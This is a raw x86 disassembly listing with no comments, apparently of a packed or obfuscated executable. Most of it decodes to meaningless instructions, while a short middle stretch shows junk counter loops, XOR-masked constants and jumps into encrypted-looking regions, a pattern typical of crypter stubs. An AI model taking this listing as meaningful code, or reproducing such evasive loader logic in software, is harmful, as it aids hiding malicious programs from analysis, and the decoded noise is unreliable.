  403034:	test   DWORD PTR [ecx-0x32],esi
  403037:	fistp  QWORD PTR ds:0x8296597f
  40303d:	aad    0xde
  40303f:	fstp   st(4)
  403041:	xchg   ecx,eax
  403042:	sub    al,0x38
  403044:	lods   al,BYTE PTR ds:[esi]
  403045:	jo     0x40305c
  403047:	cmc    
  403048:	bts    DWORD PTR [eax+0x3f76e3f4],0x97
  403050:	mov    dh,0x56
  403052:	sub    eax,0x33a2c98b
  403057:	out    0x1e,al
  403059:	test   BYTE PTR [ecx],cl
  40305b:	iret   
  40305c:	lods   eax,DWORD PTR ds:[esi]
  40305d:	pusha  
  40305e:	cmp    DWORD PTR [esi],0xffffffe9
  403061:	cmp    DWORD PTR [eax],0xffffffb1
  403064:	push   ecx
  403065:	mov    edx,0x4c51e82d
  40306a:	mov    bh,0x67
  40306c:	jns    0x4030b1
  40306e:	mov    edi,0x1956f006
  403073:	(bad)  
  403074:	mov    ds:0x12e5670d,eax
  403079:	jae    0x40303e
  40307b:	mov    edi,0x48aac67b
  403080:	jg     0x4030af
  403082:	int3   
  403083:	cmc    
  403084:	and    bh,bh
  403086:	dec    eax
  403087:	push   ebx
  403088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403089:	into   
  40308a:	shl    DWORD PTR [edx-0x56fb6cab],1
  403090:	pop    edx
  403091:	jbe    0x403069
  403093:	sbb    ecx,edi
  403095:	xor    ebx,DWORD PTR gs:[edi]
  403098:	test   BYTE PTR [ecx],bl
  40309a:	add    eax,0xa28ac223
  40309f:	dec    esi
  4030a0:	pop    edi
  4030a1:	mov    ah,0xdb
  4030a3:	push   edx
  4030a4:	mov    ds:0x3285128a,eax
  4030a9:	mov    eax,0x18288721
  4030ae:	shr    BYTE PTR [esi-0x13],cl
  4030b1:	(bad)  
  4030b3:	div    ebp
  4030b5:	ds mov dh,0xfd
  4030b8:	pop    eax
  4030b9:	pop    ss
  4030ba:	pusha  
  4030bb:	dec    esp
  4030bc:	mov    bh,0x4b
  4030be:	pandn  mm2,QWORD PTR ds:0x1c3ff4d2
  4030c5:	imul   edx,DWORD PTR [edi+0x3d],0x24
  4030c9:	add    al,BYTE PTR [esi+0xef9fa87]
  4030cf:	(bad)  
  4030d0:	aaa    
  4030d1:	sti    
  4030d2:	xchg   ebp,eax
  4030d3:	cmp    ah,BYTE PTR [ebp+esi*4+0x32aa4401]
  4030da:	sbb    al,0x6
  4030dc:	call   0x4418:0xfbc26196
  4030e3:	and    eax,0x44a5ea38
  4030e8:	fnstcw WORD PTR [ebx-0x2d]
  4030eb:	fs jmp 0xe24860e8
  4030f1:	bnd jp 0x403100
  4030f4:	xor    ebx,DWORD PTR [esi+0x357296a8]
  4030fa:	add    eax,0x158fbb39
  4030ff:	sub    al,0x20
  403101:	scas   al,BYTE PTR es:[edi]
  403102:	cmp    eax,DWORD PTR [edx-0x5e]
  403105:	sar    ebx,0x81
  403108:	inc    edx
  403109:	mov    cl,0x55
  40310b:	cmp    DWORD PTR [eax],esi
  40310d:	adc    BYTE PTR [esi-0x16],bl
  403110:	(bad)  
  403111:	(bad)  
  403112:	idiv   BYTE PTR [edi-0x68b92abc]
  403118:	dec    ebx
  403119:	(bad)  
  40311a:	sbb    eax,0xb738e6f
  40311f:	int3   
  403120:	xchg   DWORD PTR [edx+0x2c],edi
  403123:	mul    BYTE PTR [edi+0x5a]
  403126:	add    esi,DWORD PTR [edi+0x37]
  403129:	in     al,dx
  40312a:	dec    ecx
  40312b:	out    dx,eax
  40312c:	ffree  st(4)
  40312e:	and    eax,ecx
  403130:	dec    ebp
  403131:	cmc    
  403132:	push   edx
  403133:	mov    ds:0xb714e04b,al
  403138:	or     eax,0xfb56faac
  40313d:	rcr    BYTE PTR [ecx-0x1],1
  403140:	inc    edi
  403141:	add    BYTE PTR [ecx+0x3c6ca52a],al
  403147:	sar    DWORD PTR [edx-0x64a7dbe1],cl
  40314d:	int3   
  40314e:	push   edi
  40314f:	push   eax
  403150:	add    eax,0x75bc4878
  403155:	loop   0x403186
  403157:	xchg   edx,eax
  403158:	mov    al,0x11
  40315a:	sbb    cl,BYTE PTR [edi+edi*1+0x97a504d]
  403161:	and    al,0x2b
  403163:	scas   al,BYTE PTR es:[edi]
  403164:	scas   al,BYTE PTR es:[edi]
  403165:	mov    eax,0xb927e1c9
  40316a:	sub    BYTE PTR [edx-0x4d7f9520],ch
  403170:	inc    edi
  403171:	clc    
  403172:	das    
  403173:	mov    esi,0x12ed14d1
  403178:	cli    
  403179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40317a:	retf   
  40317b:	xor    ebp,0xffffffcf
  40317e:	add    esp,DWORD PTR [eax-0x72da48eb]
  403184:	mov    eax,ds:0x18693632
  403189:	gs mov eax,0xd75c2dfb
  40318f:	jmp    0x40314a
  403191:	aad    0x6a
  403193:	jmp    0x191a:0x3378879e
  40319a:	jg     0x4031d5
  40319c:	pop    ss
  40319d:	test   ch,cl
  40319f:	inc    ecx
  4031a0:	iret   
  4031a1:	repnz pop ebx
  4031a3:	(bad)  
  4031a4:	fisub  DWORD PTR [eax+0xd]
  4031a7:	jno    0x40316c
  4031a9:	arpl   di,ax
  4031ab:	loope  0x40318d
  4031ad:	fld    DWORD PTR [esi]
  4031af:	fadd   QWORD PTR [eax-0x34de2034]
  4031b5:	add    WORD PTR [eax-0x3571e74d],sp
  4031bc:	cld    
  4031bd:	push   esp
  4031be:	fs test al,0xe5
  4031c1:	inc    ecx
  4031c2:	fmul   DWORD PTR [edi+0x35]
  4031c5:	lods   eax,DWORD PTR ds:[esi]
  4031c6:	inc    edi
  4031c7:	sbb    DWORD PTR [edi-0x33aada7c],esi
  4031cd:	into   
  4031ce:	mov    edx,cs
  4031d0:	add    ebp,edi
  4031d2:	js     0x4031eb
  4031d4:	add    ah,BYTE PTR ds:0xa0309b4d
  4031da:	aaa    
  4031db:	ja     0x4031de
  4031dd:	jl     0x403220
  4031df:	test   BYTE PTR [esi+0x37772188],cl
  4031e5:	push   es
  4031e6:	jb     0x403256
  4031e8:	imul   eax,edi,0x4d
  4031eb:	out    dx,eax
  4031ec:	stc    
  4031ed:	scas   al,BYTE PTR es:[edi]
  4031ee:	retf   0xf6b1
  4031f1:	shr    dh,0xb0
  4031f4:	xchg   edi,eax
  4031f5:	cmc    
  4031f6:	int    0xaf
  4031f8:	pop    esi
  4031f9:	repz xor esi,esi
  4031fc:	jp     0x40319d
  4031fe:	ins    DWORD PTR es:[edi],dx
  4031ff:	rcl    DWORD PTR [esp+edi*1],1
  403202:	mov    dh,0xe9
  403204:	add    al,0xb7
  403206:	repz and BYTE PTR [ecx],0xea
  40320a:	mov    ebx,0x9c0fed5a
  40320f:	adc    DWORD PTR [edi],edx
  403211:	ins    BYTE PTR es:[edi],dx
  403212:	in     al,dx
  403213:	mov    ?,esi
  403215:	out    dx,eax
  403216:	sub    al,0x53
  403218:	call   0x6dc:0x531d797e
  40321f:	lods   eax,DWORD PTR ds:[esi]
  403220:	inc    ebx
  403221:	shr    BYTE PTR [edi+0x5d],cl
  403224:	popa   
  403225:	loope  0x403236
  403227:	arpl   WORD PTR [eax+0x3b39ec25],bx
  40322d:	jbe    0x4032a6
  40322f:	(bad)  
  403230:	and    eax,0x5177aac5
  403235:	int3   
  403236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403237:	loopne 0x4031d6
  403239:	div    dh
  40323b:	cld    
  40323c:	add    eax,0x6fc12006
  403241:	pushf  
  403242:	inc    eax
  403243:	mov    esi,edx
  403245:	out    dx,al
  403246:	adc    cl,cl
  403248:	in     al,dx
  403249:	push   edi
  40324a:	mov    edi,0xf4b65022
  40324f:	mov    ds:0x87b8c980,al
  403254:	mov    dh,BYTE PTR [ebp-0xcc96ba5]
  40325a:	inc    eax
  40325b:	xor    eax,0x278b2976
  403260:	test   esp,ebx
  403262:	in     eax,dx
  403263:	and    ah,0xf6
  403266:	imul   ebx,eax,0xfffffff3
  403269:	xlat   BYTE PTR ds:[ebx]
  40326a:	and    bl,dl
  40326c:	mov    edi,0x66890c44
  403271:	int3   
  403272:	cmp    al,0xfc
  403274:	push   esp
  403275:	mov    al,0x96
  403277:	sbb    BYTE PTR [edi-0x30],bl
  40327a:	xor    ah,al
  40327c:	and    eax,0x62f0cefb
  403281:	pop    ebx
  403282:	leave  
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433717,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433717
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433717,edx
  4032b3:	cmp    DWORD PTR ds:0x433717,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4337ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433717,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433717
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433717,edx
  4032ef:	cmp    DWORD PTR ds:0x433717,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43369b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43375b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4336f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4336f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4336f3,ecx
  403332:	cmp    DWORD PTR ds:0x4336f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433757
  403344:	push   0x433723
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4338cc
  403351:	push   0x4337ca
  403356:	push   0x433867
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4336f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43365b,0x1f
  403378:	cmp    DWORD PTR ds:0x43365b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43365b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4336eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43365b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43365b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43365b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43365b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43365b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4336e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43372b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4336db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	in     al,dx
  403412:	adc    bl,ch
  403414:	aaa    
  403415:	push   ss
  403416:	adc    edi,DWORD PTR [esp+edi*2+0x6d]
  40341a:	jg     0x403498
  40341c:	jl     0x4033c8
  40341e:	inc    edx
  40341f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403420:	fmul   DWORD PTR [ebp+0x2a]
  403423:	sub    eax,0x3600d81f
  403428:	inc    ecx
  403429:	fbstp  TBYTE PTR [edi+0x1499b192]
  40342f:	xchg   esp,eax
  403430:	div    DWORD PTR [ecx+0xb]
  403433:	and    al,0x45
  403435:	pop    ss
  403436:	ret    0x28bc
  403439:	xchg   BYTE PTR [ebx-0x79],dh
  40343c:	dec    esp
  40343d:	push   es
  40343e:	stc    
  40343f:	or     al,0x9e
  403441:	mov    esp,0x68313c40
  403446:	(bad)  
  403447:	mov    ds:0x2e8923e1,al
  40344c:	jmp    0xb26d:0xe494db7c
  403453:	clc    
  403454:	cmp    al,0x20
  403456:	lock pusha 
  403458:	pop    ss
  403459:	jo     0x403477
  40345b:	push   edi
  40345c:	addr16 stc 
  40345e:	out    0xf9,eax
  403460:	loopne 0x4034cf
  403462:	mov    DWORD PTR [edi],esp
  403464:	mov    ebp,0xe0c56611
  403469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40346a:	ins    BYTE PTR es:[edi],dx
  40346b:	les    edx,FWORD PTR [edi-0x10797aa7]
  403471:	lea    esp,[esi+ebp*8+0x65646abd]
  403478:	mov    esi,0x157b32c8
  40347d:	jno    0x403418
  40347f:	sbb    al,bh
  403481:	js     0x40348c
  403483:	jbe    0x4034bd
  403485:	pushf  
  403486:	test   al,0x28
  403488:	push   edx
  403489:	push   ecx
  40348a:	test   BYTE PTR [esi-0x719b79d],0xc1
  403491:	shr    BYTE PTR [eax+0x5],0x25
  403495:	ds enter 0xa601,0xd9
  40349a:	mov    ebp,0xa0dce10
  40349f:	adc    al,0xcd
  4034a1:	dec    edi
  4034a2:	lods   eax,DWORD PTR ds:[esi]
  4034a3:	inc    edi
  4034a4:	mov    dl,0xcc
  4034a6:	adc    bl,BYTE PTR [esi]
  4034a8:	adc    BYTE PTR [edi-0x40c70d92],bh
  4034ae:	xchg   esp,eax
  4034af:	aam    0x97
  4034b1:	in     al,0xba
  4034b3:	inc    esi
  4034b4:	xlat   BYTE PTR ds:[ebx]
  4034b5:	push   esi
  4034b6:	jge    0x403444
  4034b8:	hlt    
  4034b9:	imul   edi,DWORD PTR ss:[edx],0x48
  4034bd:	ret    0xd292
  4034c0:	not    BYTE PTR [ecx+0x20]
  4034c3:	pop    es
  4034c4:	jnp    0x403477
  4034c6:	popa   
  4034c7:	les    ebp,FWORD PTR [eax+0x6a]
  4034ca:	pop    ds
  4034cb:	dec    BYTE PTR cs:[esi+0x4e9083c0]
  4034d2:	or     al,0x4f
  4034d4:	sbb    eax,0x74493bb7
  4034d9:	mov    eax,ds:0x9ba36064
  4034de:	push   ebp
  4034df:	cs jo  0x4034eb
  4034e2:	mov    ebx,eax
  4034e4:	pop    ds
  4034e5:	sub    eax,0x1b77419d
  4034ea:	pop    ecx
  4034eb:	pop    ebx
  4034ec:	ds popa 
  4034ee:	xor    DWORD PTR [ebp-0x24],eax
  4034f1:	pusha  
  4034f2:	cmp    DWORD PTR [esi-0x583ca24e],esp
  4034f8:	fs inc ebx
  4034fa:	mov    WORD PTR [eax+0x5fbec0a0],?
  403500:	and    eax,0xcb3f1c80
  403505:	scas   eax,DWORD PTR es:[edi]
  403506:	div    DWORD PTR [edi]
  403508:	stos   BYTE PTR es:[edi],al
  403509:	jmp    0x52e1:0x75737352
  403510:	sbb    esi,DWORD PTR [edx]
  403512:	xchg   ebx,eax
  403513:	lock sub ebx,esp
  403516:	not    edi
  403518:	sbb    al,0x5
  40351a:	pop    ecx
  40351b:	fadd   QWORD PTR [edx+ecx*8]
  40351e:	data16 sbb ch,BYTE PTR [edi]
  403521:	rcl    BYTE PTR [bp+di],cl
  403524:	xchg   esp,eax
  403525:	es push esp
  403527:	(bad)  
  403529:	in     al,dx
  40352a:	push   edi
  40352b:	jne    0x4034af
  40352d:	push   ds
  40352e:	inc    eax
  40352f:	out    0x22,al
  403531:	ror    BYTE PTR [edx+0x6c],0xd3
  403535:	lods   al,BYTE PTR ds:[esi]
  403536:	mov    ebp,0x92869104
  40353b:	leave  
  40353c:	jp     0x403591
  40353e:	cmp    edx,DWORD PTR [ecx-0x6f41eabb]
  403544:	push   0xd57c0ebb
  403549:	xor    al,0x51
  40354b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40354c:	sbb    eax,0x5a65caa9
  403551:	loopne 0x4034e8
  403553:	repz push 0x61
  403556:	xchg   ebp,eax
  403557:	and    BYTE PTR ds:0xd5fe0b0b,ah
  40355d:	mov    ds:0x2555de3a,eax
  403562:	pop    edx
  403563:	out    dx,al
  403564:	mov    ebp,esp
  403566:	addr16 dec ebx
  403568:	sbb    ebx,eax
  40356a:	cmp    dl,dl
  40356c:	inc    eax
  40356d:	mov    eax,ds:0xffe66edf
  403572:	clc    
  403573:	mov    bl,0x72
  403575:	dec    sp
  403577:	dec    esp
  403578:	fwait
  403579:	mov    ah,0xa
  40357b:	fiadd  DWORD PTR [esi]
  40357d:	ficom  WORD PTR [eax]
  40357f:	mov    eax,ds:0x1a28290e
  403584:	sub    eax,0xa1521dd7
  403589:	jmp    WORD PTR [edi+0x454fb6a3]
  403590:	and    al,0x9d
  403592:	in     eax,dx
  403593:	dec    ebp
  403594:	retf   0xab7
  403597:	stos   BYTE PTR es:[edi],al
  403598:	out    0x74,eax
  40359a:	int    0x74
  40359c:	xor    DWORD PTR [ebx],esp
  40359e:	lods   eax,DWORD PTR ds:[esi]
  40359f:	neg    BYTE PTR [ecx-0x55cb78e3]
  4035a5:	sub    al,0xd6
  4035a7:	cmp    al,dl
  4035a9:	ror    DWORD PTR [edi-0x6a],1
  4035ac:	or     eax,0xb09f8939
  4035b1:	lods   eax,DWORD PTR ds:[esi]
  4035b2:	mov    BYTE PTR [ecx+0x6563a611],dh
  4035b8:	sbb    eax,0xb51cd0b
  4035bd:	aaa    
  4035be:	xchg   edi,eax
  4035bf:	xchg   ebx,eax
  4035c0:	push   esi
  4035c1:	aas    
  4035c2:	pop    esp
  4035c3:	mov    ch,0xd9
  4035c5:	out    0xee,al
  4035c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035c8:	cmp    DWORD PTR [edi+ebx*4],0xd5f02ec3
  4035cf:	xchg   BYTE PTR [ebx+ecx*4-0x487581df],al
  4035d6:	outs   dx,BYTE PTR ds:[esi]
  4035d7:	mov    ecx,DWORD PTR [ecx+0x2c3ccee1]
  4035dd:	push   cs
  4035de:	jnp    0x403612
  4035e0:	loop   0x403592
  4035e2:	cli    
  4035e3:	(bad)  
  4035e4:	pop    es
  4035e5:	and    eax,0x22aa6050
  4035ea:	jo     0x4035ed
  4035ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035ed:	xchg   DWORD PTR [esi],edx
  4035ef:	fdivr  st(4),st
  4035f1:	sub    eax,0xd315a10f
  4035f6:	mov    ebp,fs
  4035f8:	dec    esi
  4035f9:	call   0xec458330
  4035fe:	push   es
  4035ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403600:	add    ecx,DWORD PTR [edx-0x7f83597f]
  403606:	ja     0x40360b
  403608:	fs xchg ebp,eax
  40360a:	shr    esi,0x8b
  40360d:	push   ebp
  40360e:	clc    
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x8d421376
  403649:	in     eax,dx
  40364a:	pop    es
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	sti    
  403653:	outs   dx,DWORD PTR ds:[esi]
  403654:	dec    esi
  403655:	lods   al,BYTE PTR ds:[esi]
  403656:	div    DWORD PTR [eax+0x45]
  403659:	inc    ebx
  40365a:	inc    ecx
  40365b:	(bad)  
  40365c:	dec    edi
  40365d:	lods   al,BYTE PTR ds:[esi]
  40365e:	jnp    0x4035e6
  403660:	loopne 0x403669
  403662:	xchg   bl,al
  403664:	adc    eax,ebp
  403666:	aam    0xd
  403668:	in     al,dx
  403669:	mov    al,0x1a
  40366b:	jo     0x4036cc
  40366d:	bound  esp,QWORD PTR [ebx-0xf7d0df7]
  403673:	jo     0x40363c
  403675:	jmp    0x4036eb
  403677:	adc    eax,0xd29c264f
  40367c:	pop    edi
  40367d:	hlt    
  40367e:	sub    bl,BYTE PTR [ecx+0x48398ab6]
  403684:	pop    ebx
  403685:	shr    DWORD PTR [eax+eax*8+0x3e93a72b],1
  40368c:	cmc    
  40368d:	pop    edx
  40368e:	jmp    0xc092:0xc0b635a2
  403695:	sub    eax,0xfd345c1e
  40369a:	add    al,0x3d
  40369c:	lahf   
  40369d:	inc    ecx
  40369e:	rcr    cl,0xa4
  4036a1:	lds    esp,FWORD PTR [edi]
  4036a3:	push   edx
  4036a4:	lea    ebx,ds:0x811c2ec8
  4036aa:	pop    esp
  4036ab:	inc    eax
  4036ac:	lock por mm3,mm3
  4036b0:	bnd jo 0x4036af
  4036b3:	xchg   edi,eax
  4036b4:	and    ah,0x81
  4036b7:	pop    edx
  4036b8:	and    ebp,esp
  4036ba:	shr    esp,0x3b
  4036bd:	mov    dh,BYTE PTR [edi+0x2d87a9ef]
  4036c3:	xlat   BYTE PTR ds:[ebx]
  4036c4:	xchg   DWORD PTR [esi-0x3aa6da0e],ebx
  4036ca:	(bad)  
  4036cb:	xchg   ecx,eax
  4036cc:	cmp    BYTE PTR [ebx-0x26],dh
  4036cf:	xlat   BYTE PTR ds:[ebx]
  4036d0:	addr16 jmp 0x272d:0x5880e6db
  4036d8:	fnstenv es:[ecx-0x6e]
  4036dc:	fmul   DWORD PTR [esi+0x46b88408]
  4036e2:	or     dl,ah
  4036e4:	fbstp  TBYTE PTR [esi]
  4036e6:	outs   dx,BYTE PTR ds:[esi]
  4036e7:	(bad)  
  4036e8:	enter  0x96a5,0x59
  4036ec:	shl    BYTE PTR [eax],cl
  4036ee:	xchg   BYTE PTR [edi],bh
  4036f0:	es test al,0x49
  4036f3:	add    eax,0xa51e889e
  4036f8:	dec    edx
  4036f9:	add    DWORD PTR [ecx+0x1bac78b5],ebx
  4036ff:	mov    al,0xb5
  403701:	call   0xbedf:0x3662bfa6
  403708:	fidivr DWORD PTR [edx+ecx*8+0x1b037223]
  40370f:	push   0xffffffb6
  403711:	push   sp
  403713:	cmc    
  403714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403715:	xchg   esi,eax
  403716:	dec    esi
  403717:	in     eax,0x72
  403719:	shl    DWORD PTR [eax-0x4f48526c],1
  40371f:	pop    esp
  403720:	in     eax,dx
  403721:	imul   esi,esi,0x7f
  403724:	test   eax,0xdbc314d9
  403729:	pop    ecx
  40372a:	xor    BYTE PTR [edx],0xfd
  40372d:	idiv   BYTE PTR [edi]
  40372f:	outs   dx,BYTE PTR ds:[esi]
  403730:	popa   
  403731:	jae    0x403738
  403733:	fsub   QWORD PTR [edi-0x6e5e200f]
  403739:	jl     0x4036d0
  40373b:	jmp    0xcabc:0xde58ea55
  403742:	and    BYTE PTR [ebp+ebx*4+0x5a40266e],0x11
  40374a:	sbb    eax,0x62b1719f
  40374f:	ss (bad) 
  403751:	adc    DWORD PTR [edi+0x63fdd54f],esi
  403757:	mov    ecx,0x2e3a3aad
  40375c:	lds    ebp,FWORD PTR [edx+0x411a069a]
  403762:	xchg   BYTE PTR [ecx+esi*4-0x35],cl
  403766:	daa    
  403767:	xor    eax,0xef7d1e71
  40376c:	mov    dl,0x78
  40376f:	and    DWORD PTR [ebp-0x7],esp
  403772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403773:	pop    esi
  403774:	ficom  DWORD PTR [edi+0x606bc14e]
  40377a:	mov    ebx,0x98d0cc7c
  40377f:	sbb    eax,0x682a127e
  403784:	bound  esp,QWORD PTR [eax-0x33]
  403787:	jge    0x40375c
  403789:	stos   BYTE PTR es:[edi],al
  40378a:	or     BYTE PTR [ebx+ecx*8],bh
  40378d:	xor    BYTE PTR [esi],al
  40378f:	mov    ds:0xbef9a354,eax
  403794:	mov    bl,0x4
  403796:	aad    0x7c
  403798:	jns    0x40379c
  40379a:	test   eax,0x6a2ac3f0
  40379f:	cli    
  4037a0:	hlt    
  4037a1:	ja     0x40378b
  4037a3:	dec    esp
  4037a4:	cmp    al,BYTE PTR [ebx]
  4037a6:	xor    DWORD PTR [ecx+0x4c],eax
  4037a9:	add    eax,DWORD PTR [edx-0x30]
  4037ac:	into   
  4037ad:	das    
  4037ae:	aaa    
  4037af:	cmp    bl,BYTE PTR [ecx]
  4037b1:	(bad)  
  4037b3:	and    BYTE PTR [esi+0xd5caae4],bl
  4037b9:	jecxz  0x4037a7
  4037bb:	pop    ds
  4037bc:	popf   
  4037bd:	mov    eax,0xb5e01aba
  4037c2:	loop   0x4037e7
  4037c4:	jg     0x40383f
  4037c6:	cs es mov al,0x0
  4037ca:	(bad)  
  4037cb:	mov    edx,0xfe1e385
  4037d0:	jecxz  0x403762
  4037d2:	imul   esi,DWORD PTR [ebx+0x40],0x3
  4037d6:	test   BYTE PTR [edi-0x5c0770be],0xf9
  4037dd:	xchg   edi,eax
  4037de:	pop    esp
  4037df:	xor    BYTE PTR [ecx],ch
  4037e1:	into   
  4037e2:	and    al,0xe7
  4037e4:	ins    BYTE PTR es:[edi],dx
  4037e5:	mov    eax,DWORD PTR [ebx+0x24217162]
  4037eb:	xchg   ah,ah
  4037ed:	fs dec eax
  4037ef:	sbb    eax,0x13a6bf3f
  4037f4:	pop    edx
  4037f5:	inc    edi
  4037f6:	jmp    0x403794
  4037f8:	jbe    0x4037c6
  4037fa:	lods   eax,DWORD PTR ds:[esi]
  4037fb:	pusha  
  4037fc:	int3   
  4037fd:	out    0x71,al
  4037ff:	unpckhps xmm2,XMMWORD PTR [esi-0x57]
  403803:	mov    esi,0xb95da53b
  403808:	test   al,0xd4
  40380a:	mov    edi,0xcfe16723
  40380f:	icebp  
  403810:	iret   
  403811:	cli    
  403812:	stos   DWORD PTR es:[edi],eax
  403813:	pop    es
  403814:	cld    
  403815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403817:	les    esp,FWORD PTR [esi]
  403819:	xchg   BYTE PTR [ebx-0x17a8f682],dh
  40381f:	call   0xfe9f6fc9
  403824:	pop    ds
  403825:	inc    esi
  403826:	fnstsw WORD PTR [edx]
  403828:	sub    BYTE PTR [ecx],dl
  40382a:	pop    ebx
  40382b:	hlt    
  40382c:	add    eax,DWORD PTR ds:0xaa901ad
  403832:	adc    al,0xed
  403834:	add    edi,DWORD PTR [edx-0x4a607846]
  40383a:	lods   eax,DWORD PTR ds:[esi]
  40383b:	cmp    al,0xe7
  40383d:	mov    WORD PTR [edx],gs
  40383f:	jo     0x4038b9
  403841:	mov    eax,DWORD PTR [ebp-0x8]
  403844:	jmp    0x403a50
  403849:	sar    BYTE PTR [esi+0x5d5dd03b],1
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	or     bl,bh
  403857:	or     al,0x21
  403859:	je     0x403877
  40385b:	jl     0x4038d9
  40385d:	ins    DWORD PTR es:[edi],dx
  40385e:	jg     0x4038dc
  403860:	jl     0x403809
  403862:	in     al,0xae
  403864:	(bad)
  403867:	sbb    DWORD PTR [ebp+0x170f7665],0xffffff90
  40386e:	aam    0x32
  403870:	repz adc DWORD PTR [edi+ebp*4-0x28],0xa026229e
  403879:	call   0x9e883d3c
  40387e:	sub    edx,DWORD PTR [ecx]
  403880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403881:	inc    esi
  403882:	aam    0xbb
  403884:	aas    
  403885:	xchg   esi,eax
  403886:	add    eax,0xf4b71b5e
  40388b:	dec    edi
  40388c:	cmovne ecx,DWORD PTR [ebp+0x1]
  403890:	xchg   edx,eax
  403891:	xor    ebx,DWORD PTR [esp+edi*2-0x1f13de22]
  403898:	dec    edx
  403899:	push   0x85a0c5ba
  40389e:	aad    0x1d
  4038a0:	nop
  4038a1:	mov    dh,0x41
  4038a3:	jae    0x40385d
  4038a5:	mov    al,ds:0x398b9a18
  4038ab:	call   0x340bbc8c
  4038b0:	jmp    0xa9eea081
  4038b5:	aas    
  4038b6:	pop    ebp
  4038b7:	imul   ebp,DWORD PTR [edx+0x5e],0x593007ec
  4038be:	and    bl,bh
  4038c0:	fcomp  QWORD PTR [eax+0x6c]
  4038c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038c4:	in     eax,0xbe
  4038c6:	syscall 
  4038c8:	jp     0x4038e6
  4038ca:	fnstcw WORD PTR [esi-0x54]
  4038cd:	ja     0x403878
  4038cf:	push   ecx
  4038d0:	fcmovnu st,st(2)
  4038d2:	add    DWORD PTR [ecx],esp
  4038d4:	rcl    edi,0xa3
  4038d7:	ins    BYTE PTR es:[edi],dx
  4038d8:	stos   BYTE PTR es:[edi],al
  4038d9:	or     al,0x21
  4038db:	inc    edx
  4038dc:	add    al,0x35
  4038de:	mov    esp,0x42268667
  4038e3:	pop    ebx
  4038e4:	cdq    
  4038e5:	(bad)  
  4038e6:	fwait
